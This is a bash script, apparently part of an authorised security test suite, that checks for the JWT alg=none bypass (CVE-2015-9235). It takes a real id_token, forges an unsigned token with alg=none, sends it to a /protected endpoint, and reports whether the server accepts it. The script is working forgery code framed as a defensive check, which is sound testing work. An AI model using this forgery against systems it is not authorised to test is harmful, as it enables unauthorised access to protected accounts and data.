#!/usr/bin/env bash
# A5 — JWT Algorithm Confusion (alg=none)
# OWASP ASVS v4.2 § 3.5.3 — Verify JWTs specify the allowed algorithms.
# CVE-2015-9235 / RFC 7519 §10.7
#
# Usage:
#   bash A5_jwt_algnone.sh <base_url> <id_token>
#
# The id_token is a JWT obtained after OIDC login (Profile A).
# You can extract it from the browser's session / network tab.
#
# Result:
#   VULNERABLE — /protected accepted a token with alg=none (no signature)
#   PROTECTED  — server rejected the modified token

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

BASE_URL="${1:?Usage: $0 <base_url> <id_token>}"
TOKEN="${2:-}"

if [[ -z "$TOKEN" ]]; then
  echo "[A5] SKIPPED — id_token is required for alg=none replay test"
  exit 0
fi

echo "[A5] JWT alg=none attack"
echo "     Target: $BASE_URL"
echo

# Decode header and payload (base64url → JSON)
decode_part() {
  local part="$1"
  # add padding and decode
  printf '%s' "$part" | tr '_-' '/+' | awk '{ l=length($0); pad=4-l%4; if(pad==4) pad=0; printf "%s%s\n", $0, substr("====", 1, pad) }' | base64 -d 2>/dev/null || true
}

IFS='.' read -r header_b64 payload_b64 sig_b64 <<< "$TOKEN"

echo "  [1] Original header:  $(decode_part "$header_b64")"
echo "  [2] Original payload: $(decode_part "$payload_b64" | python3 -m json.tool 2>/dev/null || decode_part "$payload_b64")"
echo

# Build forged header with alg=none
FORGED_HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${FORGED_HEADER}.${payload_b64}."
echo "  [3] Forged token (alg=none, no signature):"
echo "      ${FORGED_TOKEN:0:80}…"
echo

# Send forged token in Authorization header
STATUS=$(rcurl -s -o /tmp/b2_response.txt -w "%{http_code}" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  "${BASE_URL%/}/protected")

echo "  [4] GET /protected with forged token → HTTP $STATUS"
if [[ -s /tmp/b2_response.txt ]]; then
  echo "      Response: $(head -c 200 /tmp/b2_response.txt)"
fi

echo

if [[ "$STATUS" == "200" ]]; then
  echo "VULNERABLE — server accepted a JWT with alg=none (no signature verification)"
else
  echo "PROTECTED  — server rejected the alg=none token (HTTP $STATUS)"
fi
